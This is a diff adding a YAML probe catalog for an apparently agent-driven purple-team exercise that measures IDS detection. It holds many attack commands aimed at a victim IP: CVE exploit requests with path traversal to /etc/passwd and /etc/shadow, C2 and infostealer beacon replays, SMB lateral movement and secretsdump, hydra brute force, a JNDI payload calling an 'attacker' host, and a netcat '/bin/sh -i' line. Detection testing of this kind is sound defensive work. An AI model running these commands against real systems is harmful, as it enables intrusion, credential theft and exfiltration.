@@ -1,0 +1,1037 @@
+# probes.yaml — curated probe pool for the purple-team agent.
+#
+# Each entry:
+#   name              : short snake-case identifier the agent uses in record_finding
+#   category          : grouping (cve-2024, c2-modern, exfil-saas, ad, etc.)
+#   mitre             : primary MITRE ATT&CK technique
+#   rationale         : one-line why-this-probe
+#   expected_sids     : SIDs the agent should expect (int list or [])
+#   expected_verdict  : DETECTED | UNDETECTED — helps the agent classify
+#   already_in_catalog: true if CI's probe_catalog.json already covers this scenario
+#   command           : bash to run on the ATTACKER box (the agent SSHes and runs it)
+#
+# The agent is free to pick from the pool in any order. Probes marked
+# already_in_catalog=true probes will classify as DETECTED; the agent should
+# still run them if it wants confirmation, but promote is not expected.
+#
+# Placeholders {{VICTIM_IP}} get substituted by the agent using the victim IP
+# from its system prompt. If the agent encounters literal {{VICTIM_IP}} in a
+# command, it must replace it before executing.
+
+probes:
+  # ========================================================================
+  # Already-covered (existing catalog coverage — expected DETECTED, no new signal)
+  # ========================================================================
+
+  - name: doh-cloudflare-json
+    category: exfil
+    mitre: T1572
+    rationale: "DoH JSON API to Cloudflare — ET SNI match"
+    expected_sids: [2027695]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      LABEL=$(head -c 30 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 30)
+      curl -sS --max-time 5 -H 'accept: application/dns-json' \
+        "https://cloudflare-dns.com/dns-query?name=${LABEL}.example.com&type=A" >/dev/null
+
+  - name: cryptominer-supportxmr-sni
+    category: c2
+    mitre: T1496
+    rationale: "supportxmr.com pool SNI — ET CoinMiner"
+    expected_sids: [2047929]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 -k "https://pool.supportxmr.com/" -o /dev/null
+
+  - name: xmrig-stratum-login
+    category: c2
+    mitre: T1496
+    rationale: "XMRig stratum login JSON to :3333 — ET Miner Checkin"
+    expected_sids: [2024792]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      printf '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"41ABC","pass":"x","agent":"XMRig/6.21.0","algo":["rx/0"]}}\n' \
+        | timeout 3 nc pool.supportxmr.com 3333 >/dev/null 2>&1
+
+  - name: teamcity-cve-2024-27198
+    category: cve-2024
+    mitre: T1190
+    rationale: "TeamCity auth-bypass via ;.jsp path traversal"
+    expected_sids: [2051505]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 -XPOST "http://{{VICTIM_IP}}:8080/hax?jsp=/app/rest/users;.jsp" \
+        -H 'Content-Type: application/xml' \
+        -d '<user username="h" password="h" email="h@x" roles="ROLE_SYSTEM_ADMIN"/>' >/dev/null
+
+  - name: screenconnect-cve-2024-1709
+    category: cve-2024
+    mitre: T1190
+    rationale: "ScreenConnect SetupWizard auth-bypass"
+    expected_sids: [2050988]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/SetupWizard.aspx/SetupCompleted" >/dev/null
+
+  # ========================================================================
+  # 2024-2025 edge-device CVEs — mostly UNDETECTED in our current ET snapshot
+  # ========================================================================
+
+  - name: panos-cve-2024-3400-sessid
+    category: cve-2024
+    mitre: T1190
+    rationale: "PAN-OS GlobalProtect SESSID path traversal (CISA KEV)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/global-protect/portal/" \
+        -H "Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/payload" >/dev/null
+
+  - name: crushftp-cve-2024-4040-ssti
+    category: cve-2024
+    mitre: T1190
+    rationale: "CrushFTP SSTI / path-traversal"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/?command=zip&c2f=<INCLUDE>/../../../../../../etc/passwd</INCLUDE>" >/dev/null
+
+  - name: crushftp-cve-2025-2825
+    category: cve-2025
+    mitre: T1190
+    rationale: "CrushFTP auth-bypass 2025"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/" \
+        -H 'Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/20250101/us-east-1/s3/aws4_request' >/dev/null
+
+  - name: fortios-cve-2024-21762
+    category: cve-2024
+    mitre: T1190
+    rationale: "FortiOS SSL-VPN OOB write via chunked+CL mismatch"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "http://{{VICTIM_IP}}/remote/error" \
+        -H 'Content-Length: 999999999' -H 'Transfer-Encoding: chunked' \
+        --data-binary $'A\r\nAAAAAAAAAA\r\n0\r\n\r\n' >/dev/null
+
+  - name: citrixbleed-2-cve-2025-5777
+    category: cve-2025
+    mitre: T1190
+    rationale: "Netscaler memory disclosure via repeated malformed login POST"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      for i in $(seq 1 10); do
+        curl -sS --max-time 3 -XPOST "http://{{VICTIM_IP}}/p/u/doAuthentication.do" \
+          -H 'Content-Type: application/x-www-form-urlencoded' \
+          --data-binary 'login=' >/dev/null
+      done
+
+  - name: cisco-fmc-cve-2026-20079
+    category: cve-2026
+    mitre: T1190
+    rationale: "Cisco FMC auth-bypass (ET v11172, Apr 2026)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/api/fmc_platform/v1/auth/generatetoken" \
+        -H 'Accept: application/json' -H 'User-Agent: FMC-Client' >/dev/null
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/ui/login.cgi?a=/../../../etc/shadow" >/dev/null
+
+  # ========================================================================
+  # Modern C2 framework URI replay — mostly UNDETECTED (fingerprint-specific rules
+  # don't match curl replay shape)
+  # ========================================================================
+
+  - name: sliver-http-urls
+    category: c2-modern
+    mitre: T1071.001
+    rationale: "Sliver default HTTP-profile URI paths"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      for u in /admin /admin.php /api/v1/beacon /sliver/beacon /session/token; do
+        curl -sS --max-time 3 -A 'Mozilla/5.0 Sliver/1.5.42' "http://{{VICTIM_IP}}$u" >/dev/null
+      done
+
+  - name: havoc-default-profile
+    category: c2-modern
+    mitre: T1071.001
+    rationale: "Havoc __cfduid cookie + MZ-prefixed body"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "http://{{VICTIM_IP}}/" \
+        -H 'Cookie: __cfduid=da2d5c4b19d8b0e1f4b87d6f9a0e1b2c3' \
+        --data-binary $'\x4d\x5a\x90\x00\x03\x00\x00\x00' >/dev/null
+
+  - name: mythic-apollo-agent-message
+    category: c2-modern
+    mitre: T1071.001
+    rationale: "Mythic Apollo /api/v1.4/agent_message POST — custom SID 9000603"
+    expected_sids: [9000603]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      BODY=$(echo -n '{"action":"get_tasking"}' | base64 -w0)
+      curl -sS --max-time 5 -XPOST "http://{{VICTIM_IP}}/api/v1.4/agent_message" \
+        --data "$BODY" >/dev/null
+
+  - name: cs-jquery-c2
+    category: c2-modern
+    mitre: T1071.001
+    rationale: "Cobalt Strike jquery-c2 malleable-profile URI"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      CFDUID=$(head -c 40 /dev/urandom | base64 | tr -dc 'a-f0-9' | head -c 40)
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/jquery-3.3.1.min.js?__cfduid=$CFDUID" \
+        -A 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko' >/dev/null
+
+  - name: brute-ratel-api-search
+    category: c2-modern
+    mitre: T1071.001
+    rationale: "Brute Ratel /api/search profile"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/api/search?q=test" \
+        -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' >/dev/null
+
+  # ========================================================================
+  # 2024-2025 infostealer C2 URI patterns — ET MALWARE rules exist but
+  # require byte-fidelity payloads; expected UNDETECTED for curl replay.
+  # ========================================================================
+
+  - name: lumma-life-beacon
+    category: malware-stealer
+    mitre: T1041
+    rationale: "LummaStealer TeslaBrowser UA + act=life"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -A 'TeslaBrowser/5.5' -XPOST "http://{{VICTIM_IP}}/api" \
+        -d 'act=life&hwid=DEADBEEF&lid=abc' >/dev/null
+
+  - name: stealc-multipart-checkin
+    category: malware-stealer
+    mitre: T1041
+    rationale: "StealC multipart hwid+build POST — ET 2044243 requires exact multipart"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "http://{{VICTIM_IP}}/abc.php" \
+        -F 'hwid=DEADBEEF-1234' -F 'build=default' >/dev/null
+
+  - name: pikabot-admin-json
+    category: malware-loader
+    mitre: T1041
+    rationale: "PikaBot /admin.php JSON heartbeat"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "http://{{VICTIM_IP}}/admin.php" \
+        -H 'Content-Type: application/json' \
+        -d '{"user_id":"00000000-0000-0000-0000-000000000000","task":"heartbeat"}' >/dev/null
+
+  - name: netsupport-rat-gate
+    category: malware-rat
+    mitre: T1071.001
+    rationale: "NetSupport Manager UA + /fakeurl.htm + /gate.php"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -A 'NetSupport Manager' "http://{{VICTIM_IP}}/fakeurl.htm" >/dev/null
+      curl -sS --max-time 5 -A 'NetSupport Manager' -d 'CMD=POLL&ID=HOST1' "http://{{VICTIM_IP}}/gate.php" >/dev/null
+
+  - name: darkgate-zz-query
+    category: malware-loader
+    mitre: T1071.001
+    rationale: "DarkGate /numeric?ZZ<b64> parameter"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "http://{{VICTIM_IP}}/9876?ZZaGVsbG8=" >/dev/null
+
+  - name: socgholish-signing
+    category: malware-loader
+    mitre: T1071.001
+    rationale: "SocGholish /signing/<hex> with compromised-site Referer"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -H 'Referer: https://compromised.example' \
+        "http://{{VICTIM_IP}}/signing/abc123def456?q=update" >/dev/null
+
+  # ========================================================================
+  # SaaS / Identity / webhook C2 — TLS SNI-based. Most have ET rules that
+  # key on SNI alone, so they often DETECT on first exercise (or are already
+  # already in catalog).
+  # ========================================================================
+
+  - name: telegram-bot-api-sni
+    category: exfil-saas
+    mitre: T1567
+    rationale: "Telegram Bot API SNI exfil"
+    expected_sids: [2033967]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 "https://api.telegram.org/bot1234:AAHfake/sendMessage?chat_id=1&text=x" >/dev/null
+
+  - name: dropbox-api-sni
+    category: exfil-saas
+    mitre: T1567.002
+    rationale: "content.dropboxapi.com SNI"
+    expected_sids: [2030702]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 -XPOST "https://content.dropboxapi.com/2/files/upload" \
+        -H 'Authorization: Bearer fake' --data 'x' >/dev/null
+
+  - name: openai-api-sni-exfil
+    category: exfil-saas
+    mitre: T1567
+    rationale: "OpenAI API SNI — LLM exfil (KNOWN GAP)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "https://api.openai.com/v1/chat/completions" \
+        -H 'Authorization: Bearer sk-fake' -H 'Content-Type: application/json' \
+        --data '{"model":"gpt-4","messages":[{"role":"user","content":"exfil"}]}' >/dev/null
+
+  - name: anthropic-api-sni-exfil
+    category: exfil-saas
+    mitre: T1567
+    rationale: "Anthropic Claude API SNI — LLM exfil (KNOWN GAP)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "https://api.anthropic.com/v1/messages" \
+        -H 'x-api-key: sk-ant-fake' -H 'anthropic-version: 2023-06-01' \
+        --data '{"model":"claude-3-5-sonnet-20241022","max_tokens":100,"messages":[{"role":"user","content":"exfil"}]}' >/dev/null
+
+  - name: gemini-api-sni-exfil
+    category: exfil-saas
+    mitre: T1567
+    rationale: "Google Gemini SNI — LLM exfil (KNOWN GAP)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=fake" \
+        -H 'Content-Type: application/json' --data '{"contents":[{"parts":[{"text":"x"}]}]}' >/dev/null
+
+  - name: huggingface-dataset-pull
+    category: exfil-saas
+    mitre: T1567
+    rationale: "HuggingFace dataset SNI — LLM model/data exfil"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "https://huggingface.co/datasets/test/fake" >/dev/null
+
+  - name: github-gist-c2
+    category: exfil-saas
+    mitre: T1102
+    rationale: "GitHub Gist as C2 dead-drop — SNI api.github.com"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "https://api.github.com/gists" \
+        -H 'Authorization: Bearer ghp_fake_token_aaaaaaaaaaaaaaaaaaaaaaaaaa' \
+        --data '{"public":false,"files":{"exfil.txt":{"content":"x"}}}' >/dev/null
+
+  - name: slack-webhook-c2
+    category: exfil-saas
+    mitre: T1567
+    rationale: "Slack incoming webhook SNI"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "https://hooks.slack.com/services/T00/B00/XXX" \
+        -H 'Content-Type: application/json' --data '{"text":"x"}' >/dev/null
+
+  - name: ms-oauth-devicecode
+    category: identity-abuse
+    mitre: T1528
+    rationale: "Microsoft OAuth device-code flow (Storm-2372 / APT29 pattern)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 -XPOST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
+        -H 'Content-Type: application/x-www-form-urlencoded' \
+        --data 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=user.read' >/dev/null
+
+  - name: okta-org-wellknown
+    category: identity-abuse
+    mitre: T1087.004
+    rationale: "Scattered Spider Okta /.well-known/okta-organization enum"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "https://dev-12345678.okta.com/.well-known/okta-organization" >/dev/null
+
+  - name: webhook-site-inspection
+    category: exfil-saas
+    mitre: T1567
+    rationale: "webhook.site SNI — inspection service abuse"
+    expected_sids: [2034634, 2067060]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 "https://webhook.site/" >/dev/null
+
+  # ========================================================================
+  # Supply-chain / tunneling SNI — mostly in catalog
+  # ========================================================================
+
+  - name: ngrok-free-app-sni
+    category: tunneling
+    mitre: T1090
+    rationale: "ngrok-free.app SNI — tunneling service"
+    expected_sids: [9000921, 2066057]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 "https://ngrok-free.app/" >/dev/null
+
+  - name: pythonhosted-package-pull
+    category: supply-chain
+    mitre: T1195.002
+    rationale: "files.pythonhosted.org package download SNI"
+    expected_sids: [2049202]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 "https://files.pythonhosted.org/packages/source/a/fake/fake-1.0.tar.gz" >/dev/null
+
+  - name: npm-registry-sni
+    category: supply-chain
+    mitre: T1195.002
+    rationale: "registry.npmjs.org SNI — no rule flags legitimate-looking registry"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "https://registry.npmjs.org/fake-package" >/dev/null
+
+  - name: docker-hub-sni
+    category: supply-chain
+    mitre: T1195.002
+    rationale: "registry-1.docker.io SNI"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "https://registry-1.docker.io/v2/library/xmrig-benchmark/manifests/latest" >/dev/null
+
+  - name: github-actions-oidc
+    category: supply-chain
+    mitre: T1552.001
+    rationale: "token.actions.githubusercontent.com SNI — CI/CD OIDC abuse"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      curl -sS --max-time 5 "https://token.actions.githubusercontent.com/.well-known/openid-configuration" >/dev/null
+
+  # ========================================================================
+  # Impacket live AD chain — already in catalog
+  # ========================================================================
+
+  - name: impacket-getnpusers
+    category: ad
+    mitre: T1558.004
+    rationale: "AS-REP roast pattern over TCP 88"
+    expected_sids: [9000430]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      printf 'Administrator\nadmin\nguest\n' > /tmp/purple-users.txt
+      timeout 15 impacket-GetNPUsers TESTDOM/ -usersfile /tmp/purple-users.txt \
+        -no-pass -dc-ip "{{VICTIM_IP}}" 2>/dev/null | head -3
+
+  - name: impacket-lookupsid
+    category: ad
+    mitre: T1087.002
+    rationale: "SID enumeration via lsarpc named pipe"
+    expected_sids: [9001015, 9001021]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      timeout 15 impacket-lookupsid "guest@{{VICTIM_IP}}" -no-pass 2>/dev/null | head -3
+
+  # ========================================================================
+  # Zeek-specific signal exercises
+  # ========================================================================
+
+  - name: ssh-banner-spoof
+    category: zeek-weird
+    mitre: T1036
+    rationale: "Fake SSH client banner — produces ssh.log client=<spoof>"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 3 bash -c "exec 3<>/dev/tcp/{{VICTIM_IP}}/22; \
+        echo 'SSH-2.0-OpenSSH_99.99p9-FAKE-CLIENT' >&3; \
+        read -t 2 line <&3; echo \"banner: \$line\"; exec 3<&-" 2>&1
+
+  - name: paramiko-hassh
+    category: zeek-weird
+    mitre: T1021.004
+    rationale: "Paramiko SSH client — distinct HASSH fingerprint in ssh.log"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      python3 -c "
+      import paramiko
+      try:
+        t = paramiko.Transport(('{{VICTIM_IP}}', 22))
+        t.connect(username='probe', password='wrong')
+      except Exception as e:
+        print(f'paramiko: {type(e).__name__}')
+      " 2>&1
+
+  # ========================================================================
+  # HTTP/2 evasion — already in catalog
+  # ========================================================================
+
+  - name: http2-h2c-jndi-header
+    category: evasion
+    mitre: T1090
+    rationale: "HTTP/2 h2c prior-knowledge with JNDI in UA — applayer-mismatch + http2-frame"
+    expected_sids: [2260000, 2290006]
+    expected_verdict: DETECTED
+    already_in_catalog: true
+    command: |
+      curl -sS --max-time 5 --http2-prior-knowledge "http://{{VICTIM_IP}}/" \
+        -H 'User-Agent: ${jndi:ldap://attacker:1389/a}' >/dev/null 2>&1
+
+  # ========================================================================
+  # Flightsim modules (purpose-built IDS validator)
+  # ========================================================================
+
+  - name: flightsim-c2
+    category: c2-simulator
+    mitre: T1071.001
+    rationale: "AlphaSOC flightsim c2 module — hits known reputation domains"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      if command -v flightsim >/dev/null; then
+        timeout 90 flightsim run c2 2>&1 | tail -10
+      else
+        echo "flightsim not installed"
+        exit 127
+      fi
+
+  - name: flightsim-dga
+    category: c2-simulator
+    mitre: T1568.002
+    rationale: "AlphaSOC flightsim DGA module"
+    expected_sids: []
+    expected_verdict: DETECTED
+    already_in_catalog: false
+    command: |
+      if command -v flightsim >/dev/null; then
+        timeout 90 flightsim run --fast dga 2>&1 | tail -10
+      else
+        echo "flightsim not installed"
+        exit 127
+      fi
+
+  # ========================================================================
+  # DNS abuse — dig / nslookup / python3
+  # ========================================================================
+
+  - name: dns-txt-exfil-dig
+    category: dns-exfil
+    mitre: T1048.001
+    rationale: "DNS TXT record query with base64-encoded payload label — tests DNS exfil rules"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      PAYLOAD=$(echo -n "sensitive-data-exfil-test" | base64 | tr '+/' '-_' | tr -d '=')
+      dig +short TXT "${PAYLOAD}.exfil.example.com" @8.8.8.8 2>&1 || true
+
+  - name: dns-rapid-nxdomain
+    category: dns-exfil
+    mitre: T1568.002
+    rationale: "Burst of NXDOMAIN queries to random subdomains — DGA behavioral pattern"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      for i in $(seq 1 20); do
+        LABEL=$(head -c 8 /dev/urandom | xxd -p)
+        dig +short "${LABEL}.suspicious-dga-domain.xyz" @8.8.8.8 2>&1 || true
+      done
+
+  - name: dns-long-subdomain-hex
+    category: dns-exfil
+    mitre: T1071.004
+    rationale: "Single DNS query with 63-char hex-encoded subdomain label — max-length label exfil"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      HEXLABEL=$(head -c 31 /dev/urandom | xxd -p | head -c 63)
+      dig +short "${HEXLABEL}.long-label-test.example.com" @8.8.8.8 2>&1 || true
+
+  - name: dns-iodine-handshake
+    category: dns-tunnel
+    mitre: T1572
+    rationale: "iodine DNS tunnel handshake pattern — version probe via NULL query"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      dig +short NULL "v.iodine-test.example.com" @8.8.8.8 2>&1 || true
+      dig +short NULL "z456789.iodine-test.example.com" @8.8.8.8 2>&1 || true
+
+  - name: dns-rebinding-attempt
+    category: dns-abuse
+    mitre: T1557
+    rationale: "DNS rebinding pattern — two rapid queries to same domain expecting IP change"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      for i in $(seq 1 5); do
+        dig +short A "rebind-test.example.com" @8.8.8.8 2>&1 || true
+        sleep 0.2
+      done
+
+  # ========================================================================
+  # SMB / RPC — smbclient / impacket
+  # ========================================================================
+
+  - name: smb-null-session-enum
+    category: smb
+    mitre: T1087.002
+    rationale: "SMB null session share enumeration — classic unauthenticated recon"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 smbclient -L "{{VICTIM_IP}}" -N 2>&1 | head -20
+
+  - name: smb-admin-share-access
+    category: smb
+    mitre: T1021.002
+    rationale: "Attempt to connect to ADMIN$ share — lateral movement indicator"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 smbclient "\\\\{{VICTIM_IP}}\\ADMIN\$" -N -c 'dir' 2>&1 | head -10
+
+  - name: smb-ipc-rpcclient
+    category: smb
+    mitre: T1087.002
+    rationale: "IPC$ null session + rpcclient enumdomusers — domain user enumeration"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 python3 -c "
+      from impacket.smbconnection import SMBConnection
+      try:
+          conn = SMBConnection('{{VICTIM_IP}}', '{{VICTIM_IP}}', sess_port=445)
+          conn.login('', '')
+          print('null session OK — shares:', conn.listShares())
+      except Exception as e:
+          print(f'SMB: {type(e).__name__}: {e}')
+      " 2>&1
+
+  - name: impacket-psexec-attempt
+    category: lateral-movement
+    mitre: T1569.002
+    rationale: "PsExec-style remote service creation over SMB — high-fidelity lateral movement"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 impacket-psexec "admin:wrongpassword@{{VICTIM_IP}}" 'whoami' 2>&1 | head -10
+
+  - name: impacket-wmiexec-attempt
+    category: lateral-movement
+    mitre: T1047
+    rationale: "WMI remote execution attempt — alternative lateral movement via DCOM"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 impacket-wmiexec "admin:wrongpassword@{{VICTIM_IP}}" 'whoami' 2>&1 | head -10
+
+  - name: impacket-secretsdump-attempt
+    category: credential-access
+    mitre: T1003.002
+    rationale: "Remote SAM/LSA secrets dump attempt — credential extraction"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 impacket-secretsdump "admin:wrongpassword@{{VICTIM_IP}}" 2>&1 | head -10
+
+  - name: impacket-dcomexec-mmc
+    category: lateral-movement
+    mitre: T1021.003
+    rationale: "DCOM exec via MMC20.Application — fileless lateral movement"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 10 impacket-dcomexec -object MMC20 "admin:wrongpassword@{{VICTIM_IP}}" 'whoami' 2>&1 | head -10
+
+  # ========================================================================
+  # SSH — hydra / paramiko / raw TCP
+  # ========================================================================
+
+  - name: ssh-hydra-bruteforce
+    category: bruteforce
+    mitre: T1110.001
+    rationale: "SSH password brute-force with hydra — 10 attempts, common credentials"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      printf 'root\nadmin\nubuntu\ntest\nuser\n' > /tmp/purple-users.txt
+      printf 'password\n123456\nadmin\nroot\ntest\n' > /tmp/purple-pass.txt
+      timeout 30 hydra -L /tmp/purple-users.txt -P /tmp/purple-pass.txt \
+        -t 4 -f "{{VICTIM_IP}}" ssh 2>&1 | tail -10
+
+  - name: ssh-rapid-auth-failures
+    category: bruteforce
+    mitre: T1110.003
+    rationale: "Rapid SSH auth failures from paramiko — Zeek notices::SSH::Password_Guessing"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      python3 -c "
+      import paramiko
+      for i in range(8):
+          try:
+              t = paramiko.Transport(('{{VICTIM_IP}}', 22))
+              t.connect(username=f'probe{i}', password='wrong')
+          except Exception:
+              pass
+          finally:
+              try: t.close()
+              except: pass
+      print('8 rapid SSH auth failures sent')
+      " 2>&1
+
+  - name: ssh-port-forward-attempt
+    category: tunneling
+    mitre: T1572
+    rationale: "SSH remote port forward attempt — tunneling indicator"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o PasswordAuthentication=no -o BatchMode=yes \
+        -R 8888:127.0.0.1:80 "nobody@{{VICTIM_IP}}" 2>&1 | head -5
+      echo "port-forward attempt completed (expected auth failure)"
+
+  # ========================================================================
+  # Nmap — diverse scan types
+  # ========================================================================
+
+  - name: nmap-syn-stealth-top20
+    category: scanning
+    mitre: T1595.002
+    rationale: "SYN stealth scan top 20 ports — most common recon pattern"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 30 nmap -sS --top-ports 20 -T4 -Pn "{{VICTIM_IP}}" 2>&1 | tail -25
+
+  - name: nmap-service-version
+    category: scanning
+    mitre: T1046
+    rationale: "Service version detection scan — fingerprinting indicator"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 30 nmap -sV -p 22,80,443,445,3389 -Pn "{{VICTIM_IP}}" 2>&1 | tail -15
+
+  - name: nmap-os-fingerprint
+    category: scanning
+    mitre: T1595.001
+    rationale: "OS fingerprint scan — distinctive TCP probe pattern"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 30 nmap -O --osscan-guess -Pn "{{VICTIM_IP}}" 2>&1 | tail -15
+
+  - name: nmap-vuln-scripts
+    category: scanning
+    mitre: T1595.002
+    rationale: "Nmap NSE vuln category scripts — active vulnerability scanning"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 60 nmap --script vuln -p 80,443,22,445 -Pn "{{VICTIM_IP}}" 2>&1 | tail -30
+
+  - name: nmap-udp-top10
+    category: scanning
+    mitre: T1046
+    rationale: "UDP scan top 10 ports — SNMP/DNS/NTP/TFTP discovery"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 30 nmap -sU --top-ports 10 -T4 -Pn "{{VICTIM_IP}}" 2>&1 | tail -15
+
+  - name: nmap-xmas-scan
+    category: scanning
+    mitre: T1595.002
+    rationale: "Xmas tree scan (FIN+PSH+URG) — evasion technique, distinctive on wire"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 20 nmap -sX -p 80,443,22 -Pn "{{VICTIM_IP}}" 2>&1 | tail -10
+
+  # ========================================================================
+  # Raw TCP / netcat — reverse shells, port knocking, protocol abuse
+  # ========================================================================
+
+  - name: nc-reverse-shell-pattern
+    category: c2-raw
+    mitre: T1059.004
+    rationale: "Outbound TCP to uncommon port with /bin/sh — reverse shell signature"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 3 bash -c "echo '/bin/sh -i' | nc -w 2 {{VICTIM_IP}} 4444" 2>&1 || true
